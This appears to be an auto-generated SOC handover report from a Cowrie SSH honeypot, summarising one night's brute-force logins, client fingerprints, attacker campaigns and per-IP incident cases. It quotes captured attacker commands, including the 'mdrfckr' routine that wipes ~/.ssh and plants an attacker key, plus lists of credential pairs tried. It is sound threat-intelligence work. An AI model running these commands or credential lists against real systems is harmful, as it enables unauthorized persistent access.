# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-17 |
| **Generated At** | 2026-07-17T06:21:36Z |
| **Shift Time** | 06:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **521** |
| Confirmed Threats | **467** |
| False Positives Filtered | **54** (10.4%) |
| Unique Attacker IPs | **152** |
| Countries of Origin | **37** |
| High Severity Cases | **182** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **339** |
| Malware Samples Analyzed | **4** HIGH · **33** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **215** |
| Unique Credential Pairs | **125** |
| Unique Usernames | **30** |
| Unique Passwords | **68** |
| Successful Auth Pairs | **192** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 63 |
| `admin` | 33 |
| `test` | 13 |
| `administrator` | 13 |
| `support` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 10 |
| `password` | 9 |
| `qwerty12345` | 9 |
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `LeitboGi0ro` | 7 |
| `service` | `password` | 6 |
| `support` | `support` | 6 |
| `root` | `123@@@` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `test` | `999` | `110.25.107.25` | 2026-07-17T00:57:14 |
| `test` | `999` | `10.0.0.73` | 2026-07-17T01:00:46 |
| `guest` | `12345678` | `170.233.29.157` | 2026-07-17T01:03:24 |
| `guest` | `12345678` | `12.150.243.22` | 2026-07-17T01:03:35 |
| `guest` | `12345678` | `112.161.26.125` | 2026-07-17T01:06:24 |
| `guest` | `12345678` | `41.231.85.75` | 2026-07-17T01:06:37 |
| `ubnt` | `654321` | `182.75.197.174` | 2026-07-17T01:10:16 |
| `admin` | `admin` | `121.199.34.107` | 2026-07-17T01:10:59 |
| `ubnt` | `654321` | `121.178.185.141` | 2026-07-17T01:13:30 |
| `ubnt` | `654321` | `41.220.3.101` | 2026-07-17T01:13:43 |
| `web` | `web123` | `185.242.3.195` | 2026-07-17T01:20:16 |
| `Admin` | `0000000` | `10.0.0.73` | 2026-07-17T01:25:31 |
| `service` | `password` | `122.170.97.94` | 2026-07-17T01:27:51 |
| `service` | `password` | `222.99.52.202` | 2026-07-17T01:28:00 |
| `service` | `password` | `65.20.237.191` | 2026-07-17T01:31:14 |
| `service` | `password` | `113.158.205.225` | 2026-07-17T01:31:22 |
| `service` | `password` | `10.0.0.73` | 2026-07-17T01:31:41 |
| `root` | `Yy@123456` | `103.172.236.241` | 2026-07-17T01:32:01 |
| `345gs5662d34` | `345gs5662d34` | `103.172.236.241` | 2026-07-17T01:32:05 |
| `root` | `3245gs5662d34` | `103.172.236.241` | 2026-07-17T01:32:07 |
| `web` | `web123` | `10.0.0.73` | 2026-07-17T01:34:12 |
| `support` | `support` | `176.53.159.196` | 2026-07-17T01:36:10 |
| `support` | `support` | `10.0.0.73` | 2026-07-17T01:37:28 |
| `unknown` | `passwd` | `10.0.0.73` | 2026-07-17T01:38:39 |
| `root` | `admin123` | `103.61.122.229` | 2026-07-17T01:45:16 |
| `test` | `P@ssword` | `10.0.0.73` | 2026-07-17T01:50:11 |
| `test` | `1q2w3e` | `182.75.227.178` | 2026-07-17T01:52:39 |
| `test` | `1q2w3e` | `200.159.14.187` | 2026-07-17T01:52:47 |
| `root` | `qwerty12345` | `78.187.9.111` | 2026-07-17T01:59:35 |
| `root` | `qwerty12345` | `181.233.140.250` | 2026-07-17T01:59:42 |
| `root` | `qwerty12345` | `10.0.0.73` | 2026-07-17T02:03:21 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-17T02:03:23 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-17T02:03:24 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-17T02:03:33 |
| `support` | `123321` | `85.159.164.28` | 2026-07-17T02:11:01 |
| `yhuang` | `yhuang` | `185.242.3.195` | 2026-07-17T02:12:54 |
| `123456` | `123456` | `156.238.86.2` | 2026-07-17T02:20:40 |
| `123456` | `123456` | `113.200.216.246` | 2026-07-17T02:20:48 |
| `123456` | `123456` | `10.0.0.73` | 2026-07-17T02:21:04 |
| `ida` | `123456` | `173.44.224.54` | 2026-07-17T02:22:50 |
| `345gs5662d34` | `345gs5662d34` | `173.44.224.54` | 2026-07-17T02:22:53 |
| `ida` | `3245gs5662d34` | `173.44.224.54` | 2026-07-17T02:22:54 |
| `admin` | `qwerty12345` | `121.200.54.19` | 2026-07-17T02:24:22 |
| `admin` | `qwerty12345` | `128.185.220.90` | 2026-07-17T02:24:31 |
| `yhuang` | `yhuang` | `10.0.0.73` | 2026-07-17T02:26:44 |
| `admin` | `qwerty12345` | `186.215.107.189` | 2026-07-17T02:27:46 |
| `admin` | `qwerty12345` | `116.48.150.115` | 2026-07-17T02:27:55 |
| `admin` | `qwerty12345` | `10.0.0.73` | 2026-07-17T02:28:13 |
| `centos` | `123321` | `39.164.94.190` | 2026-07-17T02:35:47 |
| `user15` | `123` | `200.155.66.2` | 2026-07-17T02:38:24 |
| `345gs5662d34` | `345gs5662d34` | `200.155.66.2` | 2026-07-17T02:38:26 |
| `user15` | `3245gs5662d34` | `200.155.66.2` | 2026-07-17T02:38:27 |
| `centos` | `123321` | `203.123.219.137` | 2026-07-17T02:39:14 |
| `centos` | `123321` | `10.0.0.73` | 2026-07-17T02:39:35 |
| `debian` | `debian@2025` | `62.132.18.142` | 2026-07-17T02:45:05 |
| `345gs5662d34` | `345gs5662d34` | `62.132.18.142` | 2026-07-17T02:45:07 |
| `debian` | `3245gs5662d34` | `62.132.18.142` | 2026-07-17T02:45:07 |
| `unknown` | `admin` | `122.170.111.140` | 2026-07-17T02:45:32 |
| `ubuntu` | `admin123` | `103.61.122.229` | 2026-07-17T02:46:07 |
| `support` | `1234567890` | `14.54.22.11` | 2026-07-17T02:49:11 |
| `support` | `1234567890` | `10.0.0.73` | 2026-07-17T02:52:48 |
| `root` | `000000` | `92.118.39.71` | 2026-07-17T03:00:49 |
| `root` | `111111` | `92.118.39.71` | 2026-07-17T03:02:26 |
| `test` | `toor` | `101.13.5.49` | 2026-07-17T03:03:49 |
| `test` | `toor` | `220.161.52.149` | 2026-07-17T03:03:58 |
| `root` | `123` | `92.118.39.71` | 2026-07-17T03:04:01 |
| `test` | `toor` | `10.0.0.73` | 2026-07-17T03:04:11 |
| `root` | `123123` | `92.118.39.71` | 2026-07-17T03:05:37 |
| `root` | `Pass!@#` | `185.242.3.195` | 2026-07-17T03:05:37 |
| `guest` | `Guest2000` | `81.22.51.64` | 2026-07-17T03:06:41 |
| `guest` | `Guest2000` | `87.225.108.138` | 2026-07-17T03:06:49 |
| `root` | `123321` | `92.118.39.71` | 2026-07-17T03:07:12 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-17T03:07:43 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-17T03:07:43 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-17T03:07:52 |
| `root` | `1234` | `92.118.39.71` | 2026-07-17T03:08:47 |
| `root` | `12345` | `92.118.39.71` | 2026-07-17T03:10:24 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.240.32.90` | 2026-07-17T03:10:29 |
| `*1` | `$4` | `35.240.32.90` | 2026-07-17T03:10:37 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9015` | `35.240.32.90` | 2026-07-17T03:10:39 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-17T03:12:10 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-17T03:12:11 |
| `root` | `1234567` | `92.118.39.71` | 2026-07-17T03:13:43 |
| `root` | `12345678` | `92.118.39.71` | 2026-07-17T03:15:31 |
| `Admin` | `0000` | `110.136.126.131` | 2026-07-17T03:17:23 |
| `root` | `123456789` | `92.118.39.71` | 2026-07-17T03:17:27 |
| `Admin` | `0000` | `128.185.12.179` | 2026-07-17T03:17:33 |
| `Admin` | `0000` | `10.0.0.73` | 2026-07-17T03:17:42 |
| `root` | `1234567890` | `92.118.39.71` | 2026-07-17T03:19:16 |
| `root` | `Pass!@#` | `10.0.0.73` | 2026-07-17T03:19:47 |
| `root` | `123456a` | `92.118.39.71` | 2026-07-17T03:21:10 |
| `root` | `123456b` | `92.118.39.71` | 2026-07-17T03:22:58 |
| `root` | `123abc` | `92.118.39.71` | 2026-07-17T03:24:42 |
| `openhabian` | `openhabian` | `203.92.36.109` | 2026-07-17T03:25:14 |
| `openhabian` | `openhabian` | `220.128.137.164` | 2026-07-17T03:25:24 |
| `root` | `123qwe` | `92.118.39.71` | 2026-07-17T03:26:26 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-07-17T03:28:18 |
| `root` | `555555` | `92.118.39.71` | 2026-07-17T03:30:15 |
| `root` | `654321` | `92.118.39.71` | 2026-07-17T03:31:55 |
| `root` | `7777777` | `92.118.39.71` | 2026-07-17T03:33:38 |
| `root` | `abc123` | `92.118.39.71` | 2026-07-17T03:35:38 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.4.158` | 2026-07-17T03:37:20 |
| `*1` | `$4` | `34.76.4.158` | 2026-07-17T03:37:33 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5010` | `34.76.4.158` | 2026-07-17T03:37:35 |
| `root` | `admin` | `92.118.39.71` | 2026-07-17T03:37:44 |
| `root` | `sipwise` | `45.167.250.45` | 2026-07-17T03:38:50 |
| `root` | `sipwise` | `124.67.120.106` | 2026-07-17T03:39:00 |
| `root` | `admin123` | `92.118.39.71` | 2026-07-17T03:39:33 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-07-17T03:41:25 |
| `root` | `sipwise` | `10.0.0.73` | 2026-07-17T03:42:31 |
| `root` | `password` | `92.118.39.71` | 2026-07-17T03:43:14 |
| `root` | `password1` | `92.118.39.71` | 2026-07-17T03:45:01 |
| `root` | `qwerty` | `92.118.39.71` | 2026-07-17T03:46:51 |
| `root` | `welcome` | `92.118.39.71` | 2026-07-17T03:48:56 |
| `admin` | `000000` | `92.118.39.71` | 2026-07-17T03:50:48 |
| `admin` | `111111` | `92.118.39.71` | 2026-07-17T03:52:32 |
| `nobody` | `password` | `10.0.0.73` | 2026-07-17T03:53:38 |
| `admin` | `123` | `92.118.39.71` | 2026-07-17T03:54:16 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-17T03:55:16 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-17T03:55:16 |
| `admin` | `123123` | `92.118.39.71` | 2026-07-17T03:55:56 |
| `pi` | `123` | `187.49.63.51` | 2026-07-17T03:56:28 |
| `pi` | `123` | `201.63.52.54` | 2026-07-17T03:56:35 |
| `admin` | `123321` | `92.118.39.71` | 2026-07-17T03:57:34 |
| `systemd` | `Voidsetdownload.so` | `211.22.166.107` | 2026-07-17T03:57:45 |
| `345gs5662d34` | `345gs5662d34` | `211.22.166.107` | 2026-07-17T03:57:49 |
| `systemd` | `3245gs5662d34` | `211.22.166.107` | 2026-07-17T03:57:51 |
| `admin` | `1234` | `92.118.39.71` | 2026-07-17T03:59:16 |
| `pi` | `123` | `182.76.71.82` | 2026-07-17T03:59:58 |
| `ubuntu` | `1q2w3e4R` | `185.242.3.195` | 2026-07-17T04:00:01 |
| `pi` | `123` | `10.0.0.73` | 2026-07-17T04:00:22 |
| `admin` | `12345` | `92.118.39.71` | 2026-07-17T04:01:04 |
| `admin` | `123456` | `92.118.39.71` | 2026-07-17T04:02:56 |
| `admin` | `1234567` | `92.118.39.71` | 2026-07-17T04:04:51 |
| `admin` | `12345678` | `92.118.39.71` | 2026-07-17T04:06:52 |
| `test` | `test88` | `221.224.159.218` | 2026-07-17T04:07:00 |
| `test` | `test88` | `179.184.85.167` | 2026-07-17T04:07:13 |
| `test` | `test88` | `10.0.0.73` | 2026-07-17T04:07:25 |
| `admin` | `123456789` | `92.118.39.71` | 2026-07-17T04:08:44 |
| `admin` | `1234567890` | `92.118.39.71` | 2026-07-17T04:10:24 |
| `admin` | `123456a` | `92.118.39.71` | 2026-07-17T04:12:08 |
| `admin` | `123qwe` | `92.118.39.71` | 2026-07-17T04:14:00 |
| `ubuntu` | `1q2w3e4R` | `10.0.0.73` | 2026-07-17T04:14:44 |
| `admin` | `1q2w3e4r` | `92.118.39.71` | 2026-07-17T04:15:50 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `104.155.43.49` | 2026-07-17T04:17:38 |
| `admin` | `654321` | `92.118.39.71` | 2026-07-17T04:17:41 |
| `*1` | `$4` | `104.155.43.49` | 2026-07-17T04:17:52 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4360` | `104.155.43.49` | 2026-07-17T04:17:54 |
| `blank` | `Passw@rd` | `87.103.126.54` | 2026-07-17T04:18:09 |
| `blank` | `Passw@rd` | `51.116.117.203` | 2026-07-17T04:18:15 |
| `blank` | `Passw@rd` | `10.0.0.73` | 2026-07-17T04:18:34 |
| `admin` | `7777777` | `92.118.39.71` | 2026-07-17T04:19:39 |
| `admin` | `abc123` | `92.118.39.71` | 2026-07-17T04:21:37 |
| `jarservice` | `123` | `195.25.75.65` | 2026-07-17T04:23:29 |
| `admin` | `admin` | `92.118.39.71` | 2026-07-17T04:23:30 |
| `345gs5662d34` | `345gs5662d34` | `195.25.75.65` | 2026-07-17T04:23:32 |
| `jarservice` | `3245gs5662d34` | `195.25.75.65` | 2026-07-17T04:23:33 |
| `admin` | `admin123` | `92.118.39.71` | 2026-07-17T04:25:08 |
| `root` | `Asdfg1234` | `88.99.224.40` | 2026-07-17T04:25:10 |
| `345gs5662d34` | `345gs5662d34` | `88.99.224.40` | 2026-07-17T04:25:12 |
| `root` | `3245gs5662d34` | `88.99.224.40` | 2026-07-17T04:25:13 |
| `admin` | `passw0rd` | `92.118.39.71` | 2026-07-17T04:26:49 |
| `User` | `User2011` | `118.91.176.243` | 2026-07-17T04:28:32 |
| `admin` | `password` | `92.118.39.71` | 2026-07-17T04:28:33 |
| `User` | `User2011` | `220.189.209.18` | 2026-07-17T04:28:41 |
| `admin` | `password1` | `92.118.39.71` | 2026-07-17T04:30:14 |
| `public` | `public` | `60.174.205.133` | 2026-07-17T04:31:03 |
| `admin` | `qwerty` | `92.118.39.71` | 2026-07-17T04:31:57 |
| `User` | `User2011` | `82.65.140.218` | 2026-07-17T04:31:57 |
| `User` | `User2011` | `10.0.0.73` | 2026-07-17T04:32:14 |
| `administrator` | `123` | `92.118.39.71` | 2026-07-17T04:33:45 |
| `administrator` | `123123` | `92.118.39.71` | 2026-07-17T04:35:34 |
| `administrator` | `1234` | `92.118.39.71` | 2026-07-17T04:37:25 |
| `administrator` | `12345` | `92.118.39.71` | 2026-07-17T04:39:20 |
| `administrator` | `123456` | `92.118.39.71` | 2026-07-17T04:41:14 |
| `administrator` | `1234567` | `92.118.39.71` | 2026-07-17T04:43:03 |
| `centos` | `Password` | `10.0.0.73` | 2026-07-17T04:43:19 |
| `administrator` | `12345678` | `92.118.39.71` | 2026-07-17T04:44:49 |
| `admin` | `test` | `121.159.71.249` | 2026-07-17T04:46:17 |
| `admin` | `test` | `125.23.255.134` | 2026-07-17T04:46:26 |
| `administrator` | `123456789` | `92.118.39.71` | 2026-07-17T04:46:29 |
| `administrator` | `123abc` | `92.118.39.71` | 2026-07-17T04:47:57 |
| `ubuntu` | `admin1234` | `103.61.122.229` | 2026-07-17T04:49:21 |
| `administrator` | `1q2w3e4r` | `92.118.39.71` | 2026-07-17T04:49:26 |
| `administrator` | `abc123` | `92.118.39.71` | 2026-07-17T04:50:54 |
| `root` | `sa@123456` | `14.177.234.24` | 2026-07-17T04:51:04 |
| `345gs5662d34` | `345gs5662d34` | `14.177.234.24` | 2026-07-17T04:51:09 |
| `root` | `3245gs5662d34` | `14.177.234.24` | 2026-07-17T04:51:10 |
| `administrator` | `admin` | `92.118.39.71` | 2026-07-17T04:52:25 |
| `admin` | `root` | `45.55.133.80` | 2026-07-17T04:53:23 |
| `root` | `qwerty0` | `185.242.3.195` | 2026-07-17T04:53:49 |
| `administrator` | `admin123` | `92.118.39.71` | 2026-07-17T04:53:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **521** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 88 |
| OpenSSH | 53 |
| libssh | 32 |
| Paramiko (Python) | 17 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 65 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 52 | 51 |
| `f555226df196...` | Mirai/variant | 25 | 9 |
| `16443846184e...` | Generic scanner | 13 | 3 |
| `a2de0f306611...` | Mirai/variant | 13 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 65 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 52 | 51 | Mirai/variant |
| `f555226df196...` | libssh | 25 | 9 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 13 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 6 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 64 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 9 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `62.132.18.142`, `200.155.66.2`, `88.99.224.40`, `60.174.205.133`, `211.22.166.107`, `14.177.234.24`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **152** |
| Unique ASNs | **87** |
| High-Risk ASNs | **80** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 8 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS396982` | Google LLC | 7 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 6 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS398324` | Censys, Inc. | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (182)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4c6b89054607

| Field | Detail |
|---|---|
| **Source IP** | `110.25.107[.]25` |
| **First Seen** | 2026-07-17 00:57 |
| **Last Seen** | 2026-07-17 00:57 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 00:57:04` | `cowrie.session.connect` |
| `2026-07-17 00:57:07` | `cowrie.client.version` |
| `2026-07-17 00:57:07` | `cowrie.client.kex` |
| `2026-07-17 00:57:14` | `cowrie.login.success` |
| `2026-07-17 00:57:16` | `cowrie.direct-tcpip.request` |
| `2026-07-17 00:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.25.107[.]25` to AbuseIPDB if not already reported
- [ ] Block `110.25.107[.]25` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74175f823b0a

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-07-17 01:03 |
| **Last Seen** | 2026-07-17 01:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:03:21` | `cowrie.session.connect` |
| `2026-07-17 01:03:22` | `cowrie.client.version` |
| `2026-07-17 01:03:22` | `cowrie.client.kex` |
| `2026-07-17 01:03:24` | `cowrie.login.success` |
| `2026-07-17 01:03:25` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:03:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f43b7a9d9d3d

| Field | Detail |
|---|---|
| **Source IP** | `12.150.243[.]22` |
| **First Seen** | 2026-07-17 01:03 |
| **Last Seen** | 2026-07-17 01:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:03:33` | `cowrie.session.connect` |
| `2026-07-17 01:03:34` | `cowrie.client.version` |
| `2026-07-17 01:03:34` | `cowrie.client.kex` |
| `2026-07-17 01:03:35` | `cowrie.login.success` |
| `2026-07-17 01:03:35` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `12.150.243[.]22` to AbuseIPDB if not already reported
- [ ] Block `12.150.243[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e800d587f86d

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-17 01:06 |
| **Last Seen** | 2026-07-17 01:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:06:22` | `cowrie.session.connect` |
| `2026-07-17 01:06:23` | `cowrie.client.version` |
| `2026-07-17 01:06:23` | `cowrie.client.kex` |
| `2026-07-17 01:06:24` | `cowrie.login.success` |
| `2026-07-17 01:06:25` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996aedde49d7

| Field | Detail |
|---|---|
| **Source IP** | `41.231.85[.]75` |
| **First Seen** | 2026-07-17 01:06 |
| **Last Seen** | 2026-07-17 01:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:06:35` | `cowrie.session.connect` |
| `2026-07-17 01:06:36` | `cowrie.client.version` |
| `2026-07-17 01:06:36` | `cowrie.client.kex` |
| `2026-07-17 01:06:37` | `cowrie.login.success` |
| `2026-07-17 01:06:37` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.231.85[.]75` to AbuseIPDB if not already reported
- [ ] Block `41.231.85[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fa9cfc2dc05

| Field | Detail |
|---|---|
| **Source IP** | `121.199.34[.]107` |
| **First Seen** | 2026-07-17 01:09 |
| **Last Seen** | 2026-07-17 01:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:09:57` | `cowrie.session.connect` |
| `2026-07-17 01:09:58` | `cowrie.telnet.option` |
| `2026-07-17 01:09:58` | `cowrie.telnet.option` |
| `2026-07-17 01:10:59` | `cowrie.login.success` |
| `2026-07-17 01:10:59` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `121.199.34[.]107` to AbuseIPDB if not already reported
- [ ] Block `121.199.34[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e321058c23f9

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-17 01:10 |
| **Last Seen** | 2026-07-17 01:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 01:10:13` | `cowrie.session.connect` |
| `2026-07-17 01:10:14` | `cowrie.client.version` |
| `2026-07-17 01:10:14` | `cowrie.client.kex` |
| `2026-07-17 01:10:16` | `cowrie.login.success` |
| `2026-07-17 01:10:16` | `cowrie.direct-tcpip.request` |
| `2026-07-17 01:10:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a6653a357fe

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-07-17 01:13 |
| **Last Seen** | 2026-07-17 01:13 |
